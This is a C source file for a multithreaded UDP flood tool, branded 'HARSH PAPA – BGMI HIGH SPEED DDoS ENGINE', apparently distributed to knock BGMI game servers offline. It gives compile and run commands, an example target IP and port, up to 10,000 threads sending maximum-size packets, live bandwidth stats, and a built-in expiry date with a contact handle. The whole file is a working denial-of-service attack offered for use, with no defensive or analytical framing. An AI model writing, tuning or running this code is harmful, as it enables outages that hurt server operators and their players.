/*
 * HARSH PAPA – BGMI HIGH SPEED DDoS ENGINE
 * Compile: gcc -O3 -pthread -o bgmi_highspeed bgmi_highspeed.c
 * Run: sudo ./bgmi_highspeed <IP> <PORT> <DURATION> <THREADS>
 * 
 * Features: UDP flood, multi-threaded, real-time stats, expiry date
 * Owner: @TEAMHARSH09
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <errno.h>

// ========== CONFIGURATION ==========
#define MAX_THREADS 10000
#define PACKET_SIZE 65500
#define MICRO_DELAY 0
#define EXPIRE_YEAR 2026
#define EXPIRE_MONTH 12

// ========== GLOBALS ==========
volatile int running = 1;
unsigned long long total_packets = 0;
unsigned long long total_bytes = 0;
pthread_mutex_t packet_mutex = PTHREAD_MUTEX_INITIALIZER;

char *target_ip;
int target_port;
int attack_duration;
int num_threads;
time_t attack_start_time;

// ========== EXPIRATION CHECK ==========
int is_expired() {
    time_t now = time(NULL);
    struct tm *tm_now = localtime(&now);
    int current_year = tm_now->tm_year + 1900;
    int current_month = tm_now->tm_mon + 1;
    if (current_year > EXPIRE_YEAR) return 1;
    if (current_year == EXPIRE_YEAR && current_month > EXPIRE_MONTH) return 1;
    return 0;
}

// ========== SIGNAL HANDLER ==========
void signal_handler(int sig) {
    printf("\n[!] Attack stopped by user\n");
    running = 0;
}

// ========== UDP FLOOD WORKER ==========
void *udp_flood(void *arg) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    // Increase send buffer
    int buffer_size = 256 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    
    // Non-blocking mode
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &addr.sin_addr);
    
    // Pre-allocate packet
    char *packet = malloc(PACKET_SIZE);
    if (!packet) { close(sock); return NULL; }
    memset(packet, 'X', PACKET_SIZE);
    for (int i = 0; i < 100; i++) packet[i] = rand() % 256;
    
    struct timespec ts = {0, MICRO_DELAY * 1000};
    
    while (running) {
        // Burst send
        for (int i = 0; i < 100; i++) {
            sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&addr, sizeof(addr));
        }
        if (MICRO_DELAY > 0) nanosleep(&ts, NULL);
        
        pthread_mutex_lock(&packet_mutex);
        total_packets += 100;
        total_bytes += 100 * PACKET_SIZE;
        pthread_mutex_unlock(&packet_mutex);
    }
    
    free(packet);
    close(sock);
    return NULL;
}

// ========== STATS DISPLAY ==========
void *stats_display(void *arg) {
    unsigned long long last_packets = 0, last_bytes = 0;
    while (running) {
        sleep(1);
        unsigned long long cur_packets, cur_bytes;
        pthread_mutex_lock(&packet_mutex);
        cur_packets = total_packets;
        cur_bytes = total_bytes;
        pthread_mutex_unlock(&packet_mutex);
        
        unsigned long long pps = cur_packets - last_packets;
        unsigned long long bps = cur_bytes - last_bytes;
        double gbps = (bps * 8.0) / 1e9;
        
        printf("\r[STATS] Packets: %llu | Speed: %.2f Gbps | PPS: %llu | Time: %lds/%ds   ",
               cur_packets, gbps, pps, (long)(time(NULL)-attack_start_time), attack_duration);
        fflush(stdout);
        
        last_packets = cur_packets;
        last_bytes = cur_bytes;
    }
    return NULL;
}

// ========== MAIN ==========
int main(int argc, char *argv[]) {
    if (is_expired()) {
        printf("[!] Tool expired! Contact @TEAMHARSH09\n");
        return 1;
    }
    
    if (argc < 4) {
        printf("Usage: %s <IP> <PORT> <DURATION> [THREADS]\n", argv[0]);
        printf("Example: %s 43.130.10.50 10001 60 2000\n", argv[0]);
        return 1;
    }
    
    target_ip = argv[1];
    target_port = atoi(argv[2]);
    attack_duration = atoi(argv[3]);
    num_threads = (argc == 5) ? atoi(argv[4]) : 2000;
    if (num_threads > MAX_THREADS) num_threads = MAX_THREADS;
    if (num_threads < 1) num_threads = 1;
    
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    attack_start_time = time(NULL);
    
    printf("Target: %s:%d\n", target_ip, target_port);
    printf("Duration: %d seconds\n", attack_duration);
    printf("Threads: %d\n", num_threads);
    printf("Expiry: %d-%02d\n", EXPIRE_YEAR, EXPIRE_MONTH);
    printf("Attack started... Press Ctrl+C to stop.\n\n");
    
    // Stats thread
    pthread_t stats_thread;
    pthread_create(&stats_thread, NULL, stats_display, NULL);
    
    // Attack threads
    pthread_t threads[num_threads];
    for (int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, udp_flood, NULL);
    }
    
    sleep(attack_duration);
    running = 0;
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    double elapsed = time(NULL) - attack_start_time;
    double gbps = (total_bytes * 8.0 / elapsed) / 1e9;
    
    printf("\n\n[✓] Attack Completed!\n");
    printf("Total Packets: %llu\n", total_packets);
    printf("Total Data: %.2f GB\n", total_bytes / 1073741824.0);
    printf("Average Speed: %.2f Gbps\n", gbps);
    printf("\n💀 POWERED BY @TEAMHARSH09 💀\n");
    
    return 0;
}